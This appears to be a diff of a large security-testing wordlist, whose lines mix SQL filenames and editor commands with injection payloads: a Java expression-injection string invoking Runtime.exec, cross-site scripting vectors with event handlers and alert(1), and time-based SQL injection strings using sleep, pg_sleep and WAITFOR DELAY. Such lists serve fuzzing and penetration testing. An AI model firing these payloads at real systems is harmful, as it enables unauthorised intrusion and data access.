@@ -44736,7 +44736,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventdefault()">+ drop box +</div>//["'`-->]]>]</div>
 <div onafterprint="console.log(244599)" onbeforeprint="console.log(309354)" onbeforeunload="console.log(879813)" onerror="console.log(949564)" onhashchange="console.log(575242)" onload="console.log(301053)" onmessage="console.log(976974)" onoffline="console.log(796090)" ononline="console.log(432638)" onpagehide="console.log(504345)" onpageshow="console.log(696619)" onpopstate="console.log(398418)" onresize="console.log(943097)" onstorage="console.log(882233)" onunload="console.log(929443)" onblur="console.log(932104)" onchange="console.log(102339)" oncontextmenu="console.log(761265)" onfocus="console.log(188946)" oninput="console.log(143653)" oninvalid="console.log(304208)" onreset="console.log(318472)" onsearch="console.log(778420)" onselect="console.log(942035)" onsubmit="console.log(603589)" onkeydown="console.log(650647)" onkeypress="console.log(579383)" onkeyup="console.log(821763)" onclick="console.log(284098)" ondblclick="console.log(477370)" ondrag="console.log(439095)" ondragend="console.log(546684)" ondragenter="console.log(197257)" ondragleave="console.log(238440)" ondragover="console.log(783418)" ondragstart="console.log(773843)" ondrop="console.log(436878)" onmousedown="console.log(153386)" onmousemove="console.log(598217)" onmouseout="console.log(425628)" onmouseover="console.log(359441)" onmouseup="console.log(687310)" onmousewheel="console.log(823824)" onscroll="console.log(175565)" onwheel="console.log(595449)" oncopy="console.log(243603)" oncut="console.log(841770)" onpaste="console.log(489332)" onabort="console.log(516667)" oncanplay="console.log(329437)" oncanplaythrough="console.log(754238)" oncuechange="console.log(268702)" ondurationchange="console.log(455721)" onemptied="console.log(923165)" onended="console.log(330716)" onerror="console.log(382133)" onloadeddata="console.log(268470)" onloadedmetadata="console.log(934963)" onloadstart="console.log(664605)" onpause="console.log(957774)" onplay="console.log(750548)" onplaying="console.log(887438)" onprogress="console.log(648208)" onratechange="console.log(742465)" onseeked="console.log(559902)" onseeking="console.log(296937)" onstalled="console.log(613468)" onsuspend="console.log(651399)" ontimeupdate="console.log(993291)" onvolumechange="console.log(508203)" onwaiting="console.log(146149)" onerror="console.log(470459)" onshow="console.log(586099)" ontoggle="console.log(739568)" accesskey="test3617" class="test3617" contenteditable="test3617" contextmenu="test3617" data-nent="test3617" dir="test3617" draggable="test3617" dropzone="test3617" hidden="test3617" id="test3617" lang="test3617" spellcheck="test3617" style="display:block" tabindex="test3617" title="test3617" translate="test3617" >test</div>
 <div onpointerrawupdate=alert(1) style=display:block>xss</div>
-<div style="visibility:hidden;" data-view-component="true" class="underlinenav-actions js-responsive-underlinenav-overflow position-absolute pr-3 pr-md-4 pr-lg-5 right-0">      <action-menu data-select-variant="none" data-view-component="true">
 <dl onafterprint="console.log(244599)" onbeforeprint="console.log(309354)" onbeforeunload="console.log(879813)" onerror="console.log(949564)" onhashchange="console.log(575242)" onload="console.log(301053)" onmessage="console.log(976974)" onoffline="console.log(796090)" ononline="console.log(432638)" onpagehide="console.log(504345)" onpageshow="console.log(696619)" onpopstate="console.log(398418)" onresize="console.log(943097)" onstorage="console.log(882233)" onunload="console.log(929443)" onblur="console.log(932104)" onchange="console.log(102339)" oncontextmenu="console.log(761265)" onfocus="console.log(188946)" oninput="console.log(143653)" oninvalid="console.log(304208)" onreset="console.log(318472)" onsearch="console.log(778420)" onselect="console.log(942035)" onsubmit="console.log(603589)" onkeydown="console.log(650647)" onkeypress="console.log(579383)" onkeyup="console.log(821763)" onclick="console.log(284098)" ondblclick="console.log(477370)" ondrag="console.log(439095)" ondragend="console.log(546684)" ondragenter="console.log(197257)" ondragleave="console.log(238440)" ondragover="console.log(783418)" ondragstart="console.log(773843)" ondrop="console.log(436878)" onmousedown="console.log(153386)" onmousemove="console.log(598217)" onmouseout="console.log(425628)" onmouseover="console.log(359441)" onmouseup="console.log(687310)" onmousewheel="console.log(823824)" onscroll="console.log(175565)" onwheel="console.log(595449)" oncopy="console.log(243603)" oncut="console.log(841770)" onpaste="console.log(489332)" onabort="console.log(516667)" oncanplay="console.log(329437)" oncanplaythrough="console.log(754238)" oncuechange="console.log(268702)" ondurationchange="console.log(455721)" onemptied="console.log(923165)" onended="console.log(330716)" onerror="console.log(382133)" onloadeddata="console.log(268470)" onloadedmetadata="console.log(934963)" onloadstart="console.log(664605)" onpause="console.log(957774)" onplay="console.log(750548)" onplaying="console.log(887438)" onprogress="console.log(648208)" onratechange="console.log(742465)" onseeked="console.log(559902)" onseeking="console.log(296937)" onstalled="console.log(613468)" onsuspend="console.log(651399)" ontimeupdate="console.log(993291)" onvolumechange="console.log(508203)" onwaiting="console.log(146149)" onerror="console.log(470459)" onshow="console.log(586099)" ontoggle="console.log(739568)" accesskey="test3617" class="test3617" contenteditable="test3617" contextmenu="test3617" data-nent="test3617" dir="test3617" draggable="test3617" dropzone="test3617" hidden="test3617" id="test3617" lang="test3617" spellcheck="test3617" style="display:block" tabindex="test3617" title="test3617" translate="test3617" >test</dl>
 <dl onpointerrawupdate=alert(1) style=display:block>xss</dl>
 <dt onafterprint="console.log(244599)" onbeforeprint="console.log(309354)" onbeforeunload="console.log(879813)" onerror="console.log(949564)" onhashchange="console.log(575242)" onload="console.log(301053)" onmessage="console.log(976974)" onoffline="console.log(796090)" ononline="console.log(432638)" onpagehide="console.log(504345)" onpageshow="console.log(696619)" onpopstate="console.log(398418)" onresize="console.log(943097)" onstorage="console.log(882233)" onunload="console.log(929443)" onblur="console.log(932104)" onchange="console.log(102339)" oncontextmenu="console.log(761265)" onfocus="console.log(188946)" oninput="console.log(143653)" oninvalid="console.log(304208)" onreset="console.log(318472)" onsearch="console.log(778420)" onselect="console.log(942035)" onsubmit="console.log(603589)" onkeydown="console.log(650647)" onkeypress="console.log(579383)" onkeyup="console.log(821763)" onclick="console.log(284098)" ondblclick="console.log(477370)" ondrag="console.log(439095)" ondragend="console.log(546684)" ondragenter="console.log(197257)" ondragleave="console.log(238440)" ondragover="console.log(783418)" ondragstart="console.log(773843)" ondrop="console.log(436878)" onmousedown="console.log(153386)" onmousemove="console.log(598217)" onmouseout="console.log(425628)" onmouseover="console.log(359441)" onmouseup="console.log(687310)" onmousewheel="console.log(823824)" onscroll="console.log(175565)" onwheel="console.log(595449)" oncopy="console.log(243603)" oncut="console.log(841770)" onpaste="console.log(489332)" onabort="console.log(516667)" oncanplay="console.log(329437)" oncanplaythrough="console.log(754238)" oncuechange="console.log(268702)" ondurationchange="console.log(455721)" onemptied="console.log(923165)" onended="console.log(330716)" onerror="console.log(382133)" onloadeddata="console.log(268470)" onloadedmetadata="console.log(934963)" onloadstart="console.log(664605)" onpause="console.log(957774)" onplay="console.log(750548)" onplaying="console.log(887438)" onprogress="console.log(648208)" onratechange="console.log(742465)" onseeked="console.log(559902)" onseeking="console.log(296937)" onstalled="console.log(613468)" onsuspend="console.log(651399)" ontimeupdate="console.log(993291)" onvolumechange="console.log(508203)" onwaiting="console.log(146149)" onerror="console.log(470459)" onshow="console.log(586099)" ontoggle="console.log(739568)" accesskey="test3617" class="test3617" contenteditable="test3617" contextmenu="test3617" data-nent="test3617" dir="test3617" draggable="test3617" dropzone="test3617" hidden="test3617" id="test3617" lang="test3617" spellcheck="test3617" style="display:block" tabindex="test3617" title="test3617" translate="test3617" >test</dt>
@@ -45106,102 +45105,15 @@ WAITFOR DELAY '0:0:5'--
 [ l		insert 1 line from cursor position
 [ m		delete 1 char from cursor position
 [ p		delete character from cursor position
-[01] update.sql
-[02] alter roles account.sql
-[02] update.sql
-[03] alter usuarios foro.sql
-[03] update.sql
-[04] update.sql
-[05] update.sql
-[06] update.sql
-[07] update.sql
 [12.05.2015] webshop update.sql
 [19.04.2015] atreian passport update.sql
 [2016-07-02][update]tbl_qualification-neetu.sql
 [2016-09-01]alter `tbl_user_map_jobs-neetu.sql
 [2016-6-28][update]tbl_users.sql
-[3]exec.f
 []exec.f
-[auth].[permission_delete].sql
-[auth].[permission_insert].sql
-[auth].[permission_update].sql
-[auth].[role_delete].sql
-[auth].[role_insert].sql
-[auth].[role_update].sql
-[auth].[rolepermission_delete].sql
-[auth].[rolepermission_insert].sql
-[auth].[rolepermission_update].sql
-[auth].[tableversion_delete].sql
-[auth].[tableversion_insert].sql
-[auth].[tableversion_update].sql
-[auth].[user_delete].sql
-[auth].[user_insert].sql
-[auth].[user_update].sql
-[auth].[userrole_delete].sql
-[auth].[userrole_insert].sql
-[auth].[userrole_update].sql
-[client].[tableversion_delete].sql
-[client].[tableversion_insert].sql
-[client].[tableversion_update].sql
 [cryptexec v1.01]
-[data].[binarydata_delete].sql
-[data].[binarydata_insert].sql
-[data].[binarydata_update].sql
-[data].[binarydatamoniker_delete].sql
-[data].[binarydatamoniker_insert].sql
-[data].[binarydatamoniker_update].sql
-[data].[candidate_delete].sql
-[data].[candidate_insert].sql
-[data].[candidate_update].sql
-[data].[candidatemetadata_delete].sql
-[data].[candidatemetadata_insert].sql
-[data].[candidatemetadata_update].sql
-[data].[contentinspection_delete].sql
-[data].[contentinspection_insert].sql
-[data].[contentinspection_update].sql
-[data].[election_delete].sql
-[data].[election_insert].sql
-[data].[election_update].sql
-[data].[electioncandidate_delete].sql
-[data].[electioncandidate_insert].sql
-[data].[electioncandidate_update].sql
-[data].[electionlevel_delete].sql
-[data].[electionlevel_insert].sql
-[data].[electionlevel_update].sql
-[data].[electionlevelmetadataxref_delete].sql
-[data].[electionlevelmetadataxref_insert].sql
-[data].[electionlevelmetadataxref_update].sql
-[data].[location_delete].sql
-[data].[location_insert].sql
-[data].[location_update].sql
-[data].[log_delete].sql
-[data].[log_insert].sql
-[data].[log_update].sql
-[data].[metadata_delete].sql
-[data].[metadata_insert].sql
-[data].[metadata_update].sql
-[data].[moniker_delete].sql
-[data].[moniker_insert].sql
-[data].[moniker_update].sql
-[data].[organization_delete].sql
-[data].[organization_insert].sql
-[data].[organization_update].sql
-[data].[organizationmetadata_delete].sql
-[data].[organizationmetadata_insert].sql
-[data].[organizationmetadata_update].sql
-[data].[query_delete].sql
-[data].[query_insert].sql
-[data].[query_update].sql
-[data].[tableversion_delete].sql
-[data].[tableversion_insert].sql
-[data].[tableversion_update].sql
-[data].[voter_delete].sql
-[data].[voter_insert].sql
-[data].[voter_update].sql
-[innerhtml] #insert given html without escaping dangerous characters
 [microsoft windows update cab sfx module]
 [todo: delete this before publication]
-[update]tc_change_db.sql
 \' and 1337=(select 1337 from (select sleep(120))a) --
 \' and 1337=(select 1337 from pg_sleep(120)) --
 \' and sleep(120) --
